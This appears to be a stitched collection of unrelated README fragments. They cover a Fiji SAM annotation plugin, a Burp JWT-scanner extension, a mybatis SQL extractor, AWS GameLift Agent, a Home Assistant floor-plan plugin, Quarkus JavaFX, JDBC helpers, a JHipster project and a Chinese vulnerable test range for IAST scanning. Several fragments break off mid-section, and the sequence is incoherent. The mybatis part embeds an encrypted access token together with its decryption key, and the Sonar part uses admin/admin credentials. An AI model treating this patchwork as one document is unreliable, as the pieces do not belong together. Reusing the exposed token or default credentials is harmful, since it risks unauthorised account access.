2. Choose a SAM model from the list provided within the plugin.
3. Click on the `Install` button next to the selected model.
4. Wait for the installation process to complete. This may take some time, depending on the model size, your computer, and your internet connection.

> [!CAUTION]
> Model installation times vary based on your machine's specifications, ranging from seconds to up to 20 minutes. Please be patient.



This video demonstrates the live installation of EfficientViTSAM-l1 on a Mac M1.
![Installing EfficientViTSAM-l1](./images/installing-gif.gif)



## Annotating Images

Once you have installed a model, follow these steps to annotate your image:

1. **Open Image**: Open the microscopy image you want to annotate in Fiji.
2. **Select the Image**: In the SAMJ Annotator plugin, ensure your image is selected in the dropdown bar.
3. **Start Annotation**: Click on `Go!` to begin the annotation process. This button will encode your image so you can start annotating. It can take a while.
4. **Choose Annotation Method**: Use one of the following tools to annotate your image:
   - `Rectangle (Rect)`: Draw rectangular Regions Of Interest (ROIs).
   - `Points`: Click to mark points on the image. Hold `Ctrl` to select multiple points for a single object.
   - `Brush`: Paint freeform ROIs.

   Optionally, untick the `Add to ROI Manager` checkbox if you don't want your annotations to be added to the Fiji ROI Manager automatically.
   *Note: the first annotation can take several seconds.*
5. **Annotate**: Annotate as many objects as needed. With each ROI drawn using one of the three tools, the installed SAM version will run, and the object will be annotated.
6. **Manage Annotations**: All annotations will be sent to the ROI Manager (if the checkbox is ticked), where you can perform various operations as allowed by Fiji's ROI Manager functionality.

## Saving Annotations

### All ROIs or the largest one
To save your annotations, you can opt for either exporting every ROI using the ""Return all ROIs"" feature or selecting ""Only return the largest ROI"" to export solely the largest one. In the context of annotating heterogeneous images with various ROIs, as displayed below, you have the choice to either preserve the entirety of the ROIs, which would include every annotated object, such as the nuclei and the entire embryo or to conserve exclusively the predominant ROI, which, in this example, would be the complete embryo.

![Embryo Annotation](./images/allROI-largestROI.png)

### Export to Labelling

This button simplifies the process of exporting your annotations, which are saved as semantic annotations where each marked region is assigned a distinct value. For enhanced visual clarity, we suggest altering the Look-Up Table (LUT) in Fiji (Image > Lookup Tables > Glasbey or choose another option).


<p float=""center"">
  <img src=""/images/embryo.png"" width=""25%"" />
  <img src=""/images/embryo-nuclei-labeling.png"" width=""25%"" /> 
</p>


## Usage Example

Below is an illustration of object annotation using the SAMJ-IJ plugin. Each object is delineated and labelled to showcase the plugin's straightforward and efficient capabilities in image analysis.

![Usage Example](/images/usage-example.png)

Follow this comprehensive workflow to annotate your image with SAMJ-IJ:

1. **Model Installation**: Choose and install your preferred model for image annotation. Refer to [Model Installation](#model-installation) for detailed information on each model.
2. **Open Image in Fiji**: Navigate to `File > Open` in Fiji or drag and drop your image directly into the interface.
3. **Encode Image**: With the model installed and the image open, select your image from the dropdown menu and click `Go!` to encode it. This may take some time depending on your system's capabilities.
4. **Annotation**: Annotate your image freely. All annotations will appear in the ROI manager. For clarity, when dealing with numerous closely spaced ROIs, uncheck the `Labels` option in the ROI manager. See [Annotating Images](#annotating-images) for more details.
5. **Export Annotations**: Once finished with the annotations, click `Export to Labelling...` to save your semantic annotations.
6. **Enhance Visualization**: Improve the visibility of your mask by altering the LUT. For example, you can apply the Glasbey LUT via `Image > Lookup Tables > Glasbey`.

## Use Cases
This Fiji plugin is intended to work with microscopy images. To show its versatility among different images, here are some use cases. 

![Use Cases of different annotations in microscpy images](images/annotation-examples.png)

#### a) Astrocytes stained for actin
The original image (top left in the figure) displays astrocytes stained for actin following mechanical deformation as part of a study exploring the mechanical and functional responses of astrocytes using magneto-active substrates [1]. The annotated image (bottom left in the figure) highlights individual astrocytes for detailed analysis. 
This annotation was accomplished using the ""Points Prompt"" feature coupled with the ""Return Only Largest ROI"" option to annotate each astrocyte visible in the image selectively. The primary goal of this annotation is to facilitate a comparative study of astrocyte morphology pre- and post-deformation, thus contributing valuable insights into the biomechanical properties and adaptive responses of astrocytes under stress.

#### b) Bacterial mobility on agar plates
The images (top center and bottom center in the figure) showcase the results of mobility assays for *Pseudomonas aeruginosa* strains on agar plates [2]. These assays are crucial for studying the surface motility of bacteria, which is considered a key factor in pathogenicity due to its role in chemotaxis, biofilm formation, and overall virulence. The original images depict the spread of bacteria on agar plates following incubation, captured using the Chemi DOC™ image system. The annotations made using the SAMJ plugin allow for precise measurement and analysis of the spread area, significantly automating a task that was previously manual, tedious, and time-consuming. By leveraging SAMJ for these annotations, researchers can efficiently quantify bacterial motility, facilitating deeper insights into bacterial behavior and its implications on disease spreading and antimicrobial resistance. This enhances the plugin's value in microbial research, providing a robust tool for assessing bacterial dynamics in a consistent and reproducible manner.

#### c) Organoids
The images (top right and bottom right in the figure) illustrate organoids captured for the purpose of segmentation, counting, and analysis of morphological features such as area and eccentricity [3]. These organoids are typically used to model biological processes in vitro, providing a robust platform for studies in developmental biology, disease pathology, and drug screening. The original images capture the diverse shapes and sizes of organoids, which can be challenging to quantify manually. Using the SAMJ plugin, researchers can automate the segmentation and counting of organoids, and accurately measure their area and eccentricity. This annotation capability not only enhances the precision and efficiency of the analysis but also supports high-throughput screening and detailed morphometric assessments. The ability of SAMJ to handle such complex image data demonstrates its utility in advanced biological research and experimental reproducibility.

## Features
- Select base request and autodetection of JWT
- Manually select target JWT in source request

## Usage
Run an active scan or manually select a request from to check:

1. Go to  Proxy / Repeater / Target / Logger / Intruder
2. Select request that requires a authentication with a valid JWT and returns a HTTP 200 response
> **_NOTE:_** First the extension will resend the selected request without modification and check if the JWT is still valid. If not a Error will be displayed in the Event Log

### Automatically detect JWT
3. Right-click on the request you want to check.
4. Extension -> JWT-scanner -> Autodetect JWT
5. In case of a identified vulnerability a issue is generated

提取mybatis mapper xml sql，自动mock sql参数

## 简介
+ 快速启动，只需提供xml文件，无需依赖环境加载dao层class，无需把整个屎山项目跑起来。
+ 自动mock生成sql参数，尽可能。
+ 支持扫描文件目录批量提取，生成sql文件。
+ 支持配置jdbc连接，自动执行sql，记录执行是否异常。   
[配套intellij plugin插件市场下载](https://plugins.jetbrains.com/plugin/25584-mybatis-mapper2sql/)

## 使用方式
pom.xml增加依赖
```
<dependency>
    <groupId>com.wjy</groupId>
    <artifactId>mapper2sql</artifactId>
    <version>${last.version}</version>
</dependency>
```
maven setting.xml servers标签增加一组git仓库下载配置
```
<server>
    <id>mybatis-mapper2sql</id>
    <username>handsomestWei</username>
	<!-- read:packages PAT, you need use AES decrypt with key handsomestWei -->
    <password>U2FsdGVkX1/0nXhVlZqZtTu7TPfm79znYQvarNZM/BF/nU6dx2FGwKfez62X1D78
NA4KK30oSplZVJ5+GdvKTA==</password>
</server>
```

## 使用示例
### 保留参数占位符
#### 示例代码
```java
// 指定扫描的mapper文件路径，也可以是整个项目
String resource = ""D:\\test-mapper.xml"";

// 提取sql，保留sql里的?占位符
List<MapperSqlInfo> infos = SqlUtil.parseMapper(resource, DbType.postgresql, false);

// 结果输出到控制台
for (MapperSqlInfo mapperSqlInfo : infos) {
    OutPutUtil.toStdOut(mapperSqlInfo);
}
```
#### 输出结果
```sql
---namespace=[com.xxx.dao.TestDao], dbType=[postgresql], file=[D:\test-mapper.xml]

---id=[selectByParam], testResult=[unknown], testMsg=[]
SELECT d_id, index_code
FROM tb_xxx
WHERE create_time IS NOT NULL
	AND index_code IN (?)
ORDER BY d_id DESC
LIMIT ? OFFSET (? - 1) * ?;

---id=[delete], testResult=[unknown], testMsg=[]
DELETE FROM tb_xxx
WHERE d_id IN (?);
```
### 支持自动mock参数
#### 示例代码
```java
// 指定扫描的mapper文件路径，也可以是整个项目

aws/amazon-gamelift-agent,main,"## GameLiftAgent
GameLiftAgent is a Java application that is used to launch game server processes on Amazon GameLift fleets.

This application registers a compute resource for an existing Amazon GameLift fleet using the RegisterCompute
API. The application also calls the GetComputeAuthToken API to fetch an authorization token for the compute resource,
using it to make a web socket connection to the Amazon GameLift service.

## Quick Start
### JDK Version
GameLiftAgent was built with Java 17 and will require (at least) this version to compile.
Check the java version.
```
java -version
```
If the java version is not showing Java 17, then you will have to install Java 17.

### Build the GameLiftAgent using Maven
The GameLiftAgent requires a minimum version of 3.2.5. for Maven to run.
Check your maven version with the command:
```
mvn -version
```

If the Maven version is less than version 3.2.5, you will have to update the Maven version to be at least version 3.2.5.

1. Navigate to the GameLiftAgent package root (directory including `pom.xml` file)
2. Execute the following to download dependencies, compile the project and generate a standalone jar using Maven:
```
mvn clean compile assembly:single
```
If this successfully compiles, then GameLiftAgent-1.0.jar will become available in the following path:

```
ls ./target/GameLiftAgent-1.0.jar
```

### Before running the application/jar
Make sure you have an active Anywhere fleet and an active compute for the fleet before running the JAR.
The LaunchPath for the Server Process should be the in the same location as a game build executable or
Realtime Servers script. Use the following commands to perform the setup:

1. Copy the GameLiftAgent-1.0.jar to the directory (Example: /local/game or C:\game\).
#### Linux
```
cp ./target/GameLiftAgent-1.0.jar /local/game
```

#### Powershell
```
Copy-Item -Path .\target\GameLiftAgent-1.0.jar -Destination C:\game\
```

2. Then move the game executable to the same directory (/local/game).
#### Linux
```
cp [GAME_EXECUTABLE] /local/game
```

#### Powershell
```
Copy-Item -Path [GAME_EXECUTABLE] -Destination C:\game\
```

3. Grant read and execute permissions to run the JAR and the game executable.
#### Linux
```
sudo chmod 755 /local/game/GameLiftAgent-1.0.jar
sudo chmod 755 /local/game/[GAME_EXECUTABLE]
```

### Run the application/jar
Use the following instructions to run the application:
1. The standalone jar will be located in `./target/` and can be launched with a command such as the following
(There are some example launch commands listed at the end):
```
java -jar ./target/GameLiftAgent-1.0.jar <Command Line Options>

shmuelzon/home-assistant-floor-plan,master,"# Home Assistant Floor Plan Plugin for Sweet Home 3D

This project is a plugin for the [Sweet Home 3D](https://www.sweethome3d.com/)
interior design application.
It allows creating a 3D rendered floor plan panel for Home Assistant that
displays your home's current lighting state along with icons for toggling each
light, sensors and cameras.

<img src=""doc/demo.gif"" />

## Features

* **3D Rendered Floor Plan** - Integrates with Sweet Home 3D to automatically
  generate images of your floorplan (displays current lighting state, sensors,
  and other entities with interactive icons for toggling lights)
* **Rendering Modes** - Allow user to select the best rendering option to
  generate images from his Sweet Home 3D project
* **Complete Renders Mode** - Renders images for all possible light combinations
  and rooms
* **YAML Configuration** - Generate a YAML file with the picture-elements
  structure for easy integration with Home Assistant
* **Configuration Options** -
  * Group detected lights by room
  * Adjust output resolution
  * Select rendering engine (YafaRay / SunFlow)
  * Adjust output quality (high / low)
  * Progress bar indicates rendering status
  * Create state icons for multiple entities from Home Assistant based on their
    names
  * Lights are detected as stand-alone or within groups under SH3D
  * Caches previously rendered images to save time when generating the next
    floorplan

## Rendering Modes

This plugin supports 3 modes for rendering the different lights

### CSS

In this (recommended) mode a base image is generated with all the lights turned
off. Then, for each light source, a new image is rendered with only it turned
on. The floor plan YAML then instructs the browser how to mix the different
lights sources from each render when multiple light sources interact with each
other.

This method offers good results with a low number of required images to render.

### Room Overlay

The floor plan is comprised of one base/background image without any of the
lights turned on. Then, for each light, it generates an overlay image where only
changed pixels are included and the rest of the image is transparent. This
allows for overlaying multiple images, with multiple lights turned on together
without the need for different renders for all possible combinations.

In order to get the best results for lights that do interact with each other,
i.e., the lights that appear in the same room, will be rendered with all
possible combinations. This approach significantly reduces the number of
rendered images, compared to all possible combinations of the entire floor.

### Complete Renders

This mode renders separate images for all possible light combinations on the
rendered floor. It requires generating many renders but offers the best quality.

## How To Use The Plugin

1. Download the latest plugin from the [releases](../../releases/latest) page
   and install it
2. Prepare your model to fit with the [criteria](#preparation) of this plugin
3. Start the plugin by clicking the ""Tools""->""Home Assistant Floor Plan"" menu
4. Modify the [configuration options](#configuration-options) accordingly
5. Click ""Start""
6. Copy all images under `floorplan` folder to your Home Assistant path
7. Create a card of type `picture-elements` in Home Assistant and paste the
   contents of the generated `floorplan.yaml`

## Configuration Options

<img src=""doc/options.png"" />

The configuration window displays a list of detected lights grouped according to
the room they're located in. Please verify the list matches your expectations.

* Width / Height - Configure the required output resolution of the rendered
  images
* Light mixing mode - See [Rendering Modes](#rendering-modes)
* Sensitivity - [1, 100] The degree by which two pixels need to be different
  from one another to be taken into account for the generated overlay image.
  Only relevant for ""room overlay"" light mixing mode and RGB lights
* Renderer - Select which rendering engine to use, YafaRay or SunFlow
* Quality - Choose the rendering quality (low or high)
* Render Time - The date and time of the rendered image, affects the sun
  position
* Output directory - The location on your PC where the floor plan images and
  YAML will be saved

The progress bar at the bottom will indicate how many images need to be rendered
for the complete floor plan and will progress as they are ready.

You can also click on any entity from the list to reveal additional settings
that allow you to customize the entity according to your needs.

<img src=""doc/entityOptions.png"" />

* Display type - Configure how the entity is displayed on the floorplan, see
  [Elements](https://www.home-assistant.io/dashboards/picture-elements/#elements)
* Tap Action - Define what to do when the entity is tapped/clicked on, see
  [Tap Action](https://www.home-assistant.io/dashboards/actions/#tap-action)
* Always on - Only for lights, set light as always on removing its icon and it
  won't be affected by the matching Home Assistant state
* Is RGB(W) light - Only for lights, set light as an RGB light that will change
  its color in the floorplan according to the color set in Home Assistant. This
  requires installing the
  [config-template-card](https://github.com/iantrich/config-template-card)
  custom Lovelace card.

  :warning: **Note:** RGB lights are only supported in the CSS rendering mode.

## Preparation

* Set each light in SW3D with the entity name of Home Assistant, i.e.,
  `light.xxx`, `switch.xxx`
* Only light sources that are **visible** and have a **power > 0%** are
  considered
* If you have multiple light sources that are controlled by the same switch,
  e.g., spot lights, give them all the same name
* If you want to add a tool-tip to the state icon in Home Assistant, enter it
  in to the description field of the SH3D furniture
* If lights from two different rooms do interact with each other, e.g., there's
  a glass door separating the rooms, you can give both rooms the same name and
  they'll be treated as one
* To include state icons and labels for sensors, set the relevant furniture name
  to the entity name of Home Assistant, available entities for this plugin:
  * `binary_sensor.xxx`
  * `camera.xxx`
  * `climate.xxx`
  * `cover.xxx`
  * `fan.xxx`
  * `input_boolean.xxx`
  * `media_player.xxx`
  * `sensor.xxx`
  * `switch.xxx`
  * `vacuum.xxx`

## Suggestions

For best results, it's suggested to:
* Set the 3D view's time to 8:00 AM and disable ceiling lights

When using the ""Room overlay"" light mixing mode, it's also suggested to:
* Use a dark background for the 3D view
  * It can later be converted to transparent using an image editor
* Close all the doors between individually lighted rooms

## Frequently Asked Questions

* **Where should I copy the generated files and what should I copy?**
  After the process is complete, copy the floorplan folder and `floorplan.yaml`
  to your Home Assistant path, e.g., `/config/www`.

* **How do I select the desired perspective for rendering?**
  Before activating the plugin, set the SH3D project to the specific 3D point of
  view that you want to be rendered.

* **How do I change the rendering settings?**
  Prior to activating the plugin, go to ""Create photo..."" in the SH3D project
  and adjust the settings there. You do not need to render or save anything;
  simply make the changes and close the dialog.

* **Can I work on the SH3D project while rendering?**
  No, do not make any changes or interact with the 3D view while it’s rendering.
  These actions will be captured by the plugin as it scripts the renders one by
  one. Start the rendering process and then leave it to complete.

* **What's the difference between `renders` and `floorplan` folders?**
  The renders directory includes the rendered images as generated by SH3D. The
  floorplan directory includes the images you need to copy over to Home Assistant.
  With the CSS option, both directories are pretty much the same, except that the
  base image (with all the lights turned off) exists only in the floorplan
  directory. This is because in this mode, we let the browser to the light
  blending and this plugin doesn't need to do anything special.

  With the room overlay mode, the renders, again, includes all the images
  generated by SH3D while the floorplan directory will include the processed
  images with the transparent background.

  The renders directory was created (back when room overlay was the only option)
  in case one wanted to change any parameters (like the sensitivity) to generate a
  new floor plan without needing to wait for all the renders from SH3D, which
  don't change. It's basically a cache of rendered images.

* **What's the use of `Use existing renders` option?**
  Technically this option can work with any mode. You can start with the CSS
  mode and generate the least number of needed renders but then decide to switch
  to room overlay. When doing so, you already have part of the required renders
  and there's no need to generate them again. If you started with room overlay and
  switched to CSS, you'll have all of the required images and the whole process
  will be done in a few seconds

## Possible Future Enhancements
- [x] Allow selecting renderer (SunFlow/Yafaray)
- [x] Allow selecting quality (high/low)
- [x] Allow selecting date/time of render
- [ ] Create multiple renders for multiple hours of the day and display in Home
      Assistant according to local time
- [x] Allow stopping rendering thread
- [X] Allow enabling/disabling/configuring state-icon
- [x] Support including sensors state-icons/labels for other items
- [ ] Support fans with animated gif/png with css3 image rotation
- [x] Make sure state-icons/labels do not overlap
- [x] Allow using existing rendered images and just re-create overlays and YAML
- [ ] After rendering is complete, show preview of overlay images
- [ ] Allow overriding state-icons/labels positions, and save persistently
- [X] Allow defining, per entity, if it should be an icon or label, and save
      that persistently

This Quarkus extension allows you to use JavaFX in your Quarkus application. \
It will allow component injection in FX Controllers and will allow you to use CDI events to register on primary stage creation.

Please refer to documentation available at https://docs.quarkiverse.io/quarkus-fx/dev/index.html

You will be able to register on primary stage creation event via such code example.
```java
public class QuarkusFxApp {

  @Inject
  FXMLLoader fxmlLoader;

  public void start(@Observes final FxPostStartupEvent event) {
    try {
      InputStream fxml = this.getClass().getResourceAsStream(""/app.fxml"");
      Parent fxmlParent = this.fxmlLoader.load(fxml);

      Stage stage = event.getPrimaryStage();
      
      Scene scene = new Scene(fxmlParent);
      stage.setScene(scene);
      stage.show();

    } catch (IOException e) {
      // Handle error
    }
  }
}
```
To load multiple FXML files, you can use :
```java
@Inject
Instance<FXMLLoader> fxmlLoader;
```

Also, setting the location is required by some use cases (use of relative paths in FXML)
```java
FXMLLoader loader = this.fxmlLoader.get();
// Set location for relative path resolution
loader.setLocation(xxx);
```

For some sample apps and usage, check the `samples/` directory.

These examples use [sqlite](https://central.sonatype.com/artifact/org.xerial/sqlite-jdbc). 

<!--

### Select rows by id

Any variables injected into the template will be replaced with `?`s in the
SQL and will be set with `.setObject` on the returned `PreparedStatement`.

```java
import dev.mccue.jdbc.StatementPreparer;

void main() throws Exception {
    var db = new SQLiteDataSource();
    db.setUrl(""jdbc:sqlite:test.db"");

    var id = 1;
    try (var conn = db.getConnection()) {
        try (var stmt = StatementPreparer.of(conn).""""""
                SELECT *
                FROM widget
                WHERE id = \{id}
                """""") {
            var rs = stmt.executeQuery();
        }
    }
}
```

### Select rows by ids

List parameters are automatically expanded into `(?, ?, ?)` with
one question mark for each element in the list.

```java
import dev.mccue.jdbc.StatementPreparer;

void main() throws Exception {
    var db = new SQLiteDataSource();
    db.setUrl(""jdbc:sqlite:test.db"");

    var ids = List.of(1, 2, 3);
    try (var conn = db.getConnection()) {
        try (var stmt = StatementPreparer.of(conn).""""""
                SELECT *
                FROM widget
                WHERE id IN \{ids}
                """""") {
            var rs = stmt.executeQuery();
        }
    }
}
```

### Inject parameters with custom logic

To inject a parameter that needs to be set with something other than `setObject`,
you can make an instance of `SettableParameter`.

```java
import dev.mccue.jdbc.SettableParameter;
import dev.mccue.jdbc.StatementPreparer;

void main() throws Exception {
    var db = new SQLiteDataSource();
    db.setUrl(""jdbc:sqlite:test.db"");

    var name = ""bob"";
    try (var conn = db.getConnection()) {
        try (var stmt = StatementPreparer.of(conn).""""""
                SELECT *
                FROM widget
                WHERE name = \{SettableParameter.ofNString(name)}
                """"""){
            var rs = stmt.executeQuery();
        }
    }
}
```
-->

### Read nullable primitive types

`ResultSets` includes helpers for reading potentially null
primitive types from a `ResultSet`

```java
import dev.mccue.jdbc.ResultSets;

void main() throws Exception {
    var db = new SQLiteDataSource();
    db.setUrl(""jdbc:sqlite:test.db"");

    try (var conn = db.getConnection()) {
        try (var stmt = conn.prepareStatement(""""""
                SELECT number
                FROM widget
                LIMIT 1
                """""")) {
            var rs = stmt.executeQuery();

            // Methods exist for all primitives except char 
            // (which doesn't have a method on ResultSet)
            var number = ResultSets.getIntegerNullable(rs, ""number"");
        }
    }
}
```

### Read non-null primitive types

If you want to read a column that is primitive, but you assume
is not null, there are helpers which will throw a `SQLException`
early if that assumption is violated.

```java
import dev.mccue.jdbc.ResultSets;

void main() throws Exception {
    var db = new SQLiteDataSource();
    db.setUrl(""jdbc:sqlite:test.db"");

    try (var conn = db.getConnection()) {
        try (var stmt = conn.prepareStatement(""""""
                SELECT number
                FROM widget
                LIMIT 1
                """""")) {
            var rs = stmt.executeQuery();

            // Methods exist for all primitives except char 
            // (which doesn't have a method on ResultSet)
            var number = ResultSets.getIntegerNotNull(rs, ""number"");
        }
    }
}
```

### Read a row as a `Record`

Often when going through a `ResultSet` you will want to materialize a whole row.

```java
import dev.mccue.jdbc.ResultSets;

public record Widget(int number) {}

void main() throws Exception {
    var db = new SQLiteDataSource();
    db.setUrl(""jdbc:sqlite:test.db"");

    try (var conn = db.getConnection()) {
        try (var stmt = conn.prepareStatement(""""""
                SELECT number
                FROM widget
                LIMIT 1
                """""")) {
            var rs = stmt.executeQuery();
            var widget = ResultSets.getRecord(rs, Widget.class);

            System.out.println(widget);
        }
    }
}
```


### Read a row as a `Record` with customized mappings

If the name of a record component doesn't line up with what you want pulled from a
`ResultSet`, you can use the `@Column` annotation.

```java
import dev.mccue.jdbc.Column;
import dev.mccue.jdbc.ResultSets;

public record Widget(@Column(label = ""number"") int n) {
}

void main() throws Exception {
    var db = new SQLiteDataSource();
    db.setUrl(""jdbc:sqlite:test.db"");

    try (var conn = db.getConnection()) {
        try (var stmt = conn.prepareStatement(""""""
                SELECT number
                FROM widget
                LIMIT 1
                """""")) {
            var rs = stmt.executeQuery();
            var widget = ResultSets.getRecord(rs, Widget.class);

            System.out.println(widget);
        }
    }
}
```

<!--
### Read a row as a `Record`, customizing how a column is gotten from a `ResultSet`.

```java
import dev.mccue.jdbc.Column;
import dev.mccue.jdbc.DefaultRecordComponentGetter;
import dev.mccue.jdbc.ResultSets;

import java.lang.reflect.RecordComponent;
import java.sql.ResultSet;
import java.sql.SQLException;

public record Text(String contents) {}

public static final class CustomRecordComponentGetter 
        extends DefaultRecordComponentGetter {
    @Override
    protected Object getIndexedRecordComponent(
            ResultSet rs, 
            RecordComponent recordComponent, 
            int index
    ) throws SQLException {
        return new Text(rs.getString(index));
    }

    @Override
    protected Object getLabeledRecordComponent(
            ResultSet rs, 
            RecordComponent recordComponent, 
            String label
    ) throws SQLException {
        return new Text(rs.getString(label));
    }
}

public record Widget(
        @Column(label = ""number"") 
        int n,
        @Column(
                recordComponentGetter = CustomRecordComponentGetter.class
        )
        Text name) {
}

void main() throws Exception {
    var db = new SQLiteDataSource();
    db.setUrl(""jdbc:sqlite:test.db"");

    try (var conn = db.getConnection()) {
        try (var stmt = conn.prepareStatement(""""""
                SELECT number, name
                FROM widget
                LIMIT 1
                """""")) {
            var rs = stmt.executeQuery();
            var widget = ResultSets.getRecord(rs, Widget.class);

            System.out.println(widget);
        }
    }
}

## 项目结构

生成时需要 Node，并建议在开发过程中使用它。package.json 文件始终会生成，以提供更好的开发体验，包括 prettier、commit hooks、脚本等等。

在项目的根目录中，JHipster会生成用于配置诸如git、prettier、eslint、husky等众多常见工具的配置文件。你可以在网络上找到有关这些工具的参考文档。

`/src/*` 目录结构遵循默认的Java结构。

- `.yo-rc.json` - Yeoman配置文件（BegCode/JHipster配置文件）
  BegCode的配置存储在key为generator-begcode的属性中，这里定义了BegCode生成器的全局配置。此外，你可能会在项目根目录下的.yo-rc.json文件中找到类似generator-begcode-\*的蓝图配置，它包含了项目特定的配置选项。
- `.yo-resolve` (可选) - Yeoman 冲突解决器
  允许在发现冲突时使用特定操作，跳过匹配模式的文件的提示。每一行应该匹配 [模式] [操作]，其中模式是一个 Minimatch 模式，操作是 skip（如果省略则为默认操作）或者 force 中的一个。以 # 开头的行被视为注释，将被忽略。
- `.jhipster/*.json` - JHipster实体配置文件

- `npmw` - 用于本地安装的npm的包装器
  BegCode默认使用构建工具在本地安装Node和pnpm。此包装器确保本地安装pnpm并使用它，避免了不同版本可能引起的一些差异。通过使用./npmw而不是传统的npm，您可以配置一个无需Node的环境来开发或测试您的应用程序。
- `/src/main/docker` - 应用程序及其依赖的服务的Docker配置

## 开发

    构建系统将自动安装推荐的Node和pnpm版本。
    我们提供了一个包装器来启动 pnpm。

仅当 [package.json](package.json) 中的依赖项发生更改时，您才需要再次运行此命令。

```
./npmw install
```

我们使用 pnpm 脚本和 [Vite][] 作为我们的构建系统。

在两个单独的终端中运行以下命令，以创建更好的开发体验，其中当硬盘上的文件发生更改时您的浏览器自动刷新。

```
./mvnw
./npmw start
```

Npm 还用于管理此应用程序中使用的 CSS 和 JavaScript 依赖项。 您可以通过以下方式升级依赖项
在 [package.json](package.json) 中指定较新版本。 您还可以运行`pnpm update`和`pnpm install`来管理依赖项。
在任何命令上添加`help`标志以查看如何使用它。 例如，`pnpm help update`。

`./npmw run` 命令将列出可用于该项目运行的所有脚本。

## 系统构建

### 创建Jar包

要优化monolithMybatis应用程序创建Jar包并进行生产部署，请运行：

```
./mvnw package -Pprod clean verify -DskipTests
```

这将压缩客户端和重新打包CSS和JavaScript文件。 它还将修改`index.html`，以便引用这些新文件。
为了确保一切正常，请运行：

```
java -jar target/*.jar
```

然后在浏览器打开：[http://localhost:8080](http://localhost:8080)。

请参阅[Using JHipster in production][] 了解更多详细信息。

### 创建War包

要将您的应用程序打包为 war 以便将其部署到应用程序服务器，请运行：

```
./mvnw package -Pprod,war clean verify
```

### JHipster Control Center

JHipster Control Center 可以帮助您管理和控制您的应用程序。 您可以使用以下命令启动本地控制中心服务器（可通过 http://localhost:7419 访问）：

```
docker compose -f src/main/docker/jhipster-control-center.yml up
```

## 测试

### 运行Spring Boot 测试

要启动应用程序的测试，请运行：

```
./mvnw verify
```

### Client tests

Unit tests are run by [Jest][]. They're located in [front/src/test/javascript/](front/src/test/javascript/) and can be run with:

```
./npmw test
```

## 其他

### 使用Sonar进行代码质量控制

Sonar用于分析代码质量。 您可以使用以下命令启动本地 Sonar 服务器（可通过 http://localhost:9001 访问）：

```
docker compose -f src/main/docker/sonar.yml up -d
```

Note: we have turned off forced authentication redirect for UI in [src/main/docker/sonar.yml](src/main/docker/sonar.yml) for out of the box experience while trying out SonarQube, for real use cases turn it back on.

You can run a Sonar analysis with using the [sonar-scanner](https://docs.sonarqube.org/display/SCAN/Analyzing+with+SonarQube+Scanner) or by using the maven plugin.

Then, run a Sonar analysis:

```
./mvnw -Pprod clean verify sonar:sonar -Dsonar.login=admin -Dsonar.password=admin
```

If you need to re-run the Sonar phase, please be sure to specify at least the `initialize` phase since Sonar properties are loaded from the sonar-project.properties file.

```
./mvnw initialize sonar:sonar -Dsonar.login=admin -Dsonar.password=admin
```

Additionally, Instead of passing `sonar.password` and `sonar.login` as CLI arguments, these parameters can be configured from [sonar-project.properties](sonar-project.properties) as shown below:

```
sonar.login=admin
sonar.password=admin
```

For more information, refer to the [Code quality page][].

### Using Docker to simplify development (optional)

You can use Docker to improve your JHipster development experience. A number of docker-compose configuration are available in the [src/main/docker](src/main/docker) folder to launch required third party services.

For example, to start a mysql database in a docker container, run:

```
docker compose -f src/main/docker/mysql.yml up -d
```

To stop it and remove the container, run:

```
docker compose -f src/main/docker/mysql.yml down
```

You can also fully dockerize your application and all the services that it depends on.
To achieve this, first build a docker image of your app by running:

```
npm run java:docker
```

Or build a arm64 docker image when using an arm64 processor os like MacOS with M1 processor family running:

```
npm run java:docker:arm64
```

Then run:

```
docker compose -f src/main/docker/app.yml up -d
```

When running Docker Desktop on MacOS Big Sur or later, consider enabling experimental `Use the new Virtualization framework` for better processing performance ([disk access performance is worse](https://github.com/docker/roadmap/issues/7)).

For more information refer to [Using Docker and Docker-Compose][], this page also contains information on the docker-compose sub-generator (`jhipster docker-compose`), which is able to generate docker configurations for one or several JHipster applications.

## Continuous Integration (optional)

To configure CI for your project, run the ci-cd sub-generator (`jhipster ci-cd`), this will let you generate configuration files for a number of Continuous Integration systems. Consult the [Setting up Continuous Integration][] page for more information.

以下是运行脚本：

| :------------------------: | :----------------------------------------------------------: | :------------------------: |
| docker-compose-build.yaml  | 在容器里面构建jar包，每个靶场构建会重复构建（**构建速度会很慢，不建议**） | `bash run-build_images.sh` |
| docker-compose-local.yaml  | 宿主机maven构建各个靶场的jar包，多个靶场可以基于maven缓存快速构建（**推荐**） | `bash run-local-build.sh`  |
| docker-compose-remote.yaml | 直接去dockerhub下载我构建上传成功的镜像（**镜像更新不及时**） |    `bash run-remote.sh`    |

> 此外，需修改yaml文件里面`flask.environment.HOST`为宿主机的IP，用于跑测试用例。**然后我在yaml文件已经默认挂载agent.jar**，如果你们要测试IAST agent功能，直接替换到`agent/agent.jar`即可。我这边自己写了一个简单的java agent，参考下面[SimpleAgent]()

> 如果要测试被动代理扫描，需要修改`index/app.py`里面`proxy_mode`为`True`，修改自己的代理地址：`proxies`

> **修改完成之后，根据自己的需求，运行上面表格的sh脚本部署运行即可**。

> 因为漏洞应用比较多**但是接口比较少**，我给每个应用配置512-1024M内存（测试运行要16G内存）。如果要配置大一点测试 IAST AGENT，则可以批量修改`docker-compose.yaml`的`-Xms512m -Xmx1024m`的环境变量

## 运行

访问：`http://宿主机IP:5000/`

我配置了三种模式：

- 攻击：发送一些payload，触发漏洞
- 正常：有可能是漏洞，但是发送是正常的数据
- 修复：漏洞已经修复，但是payload不生效（过滤或者报错）
- 误报：IAST或SAST误报检测的安全漏洞

其中右边测试按钮，可以对这个接口进行用例测试。

![image-20240306164920221](.gitbook/assets/image-20240306164920221.png)

也可以自定义发送payload，进行调试

![image-20240306165001240](.gitbook/assets/image-20240306165001240.png)

也可以批量发送请求，各个漏洞的回显，会在下面显示。

## SimpleAgent

Java Agent 是一种工具，它可以使用 Java Instrumentation API 在运行时修改字节码。一个非常简单的 Java Agent 可以仅仅记录一个消息，以表明它已被加载。

首先，创建 Agent 类 `SimpleAgent.java`：

```java
package my.agent;

import java.lang.instrument.Instrumentation;

public class SimpleAgent {
    public static void premain(String agentArgs, Instrumentation inst) {
        System.out.println(""SimpleAgent 已加载"");
    }
}
```

在这段代码中，`premain` 方法是 Java Agent 的入口点。它在应用程序的 `main` 方法之前被调用。

接下来，你需要一个 manifest 文件来指定 Agent-Class。创建一个名为 `MANIFEST.MF` 的文件，内容如下：

```
Manifest-Version: 1.0
Premain-Class: my.agent.SimpleAgent
Can-Redefine-Classes: true
Can-Retransform-Classes: true
```

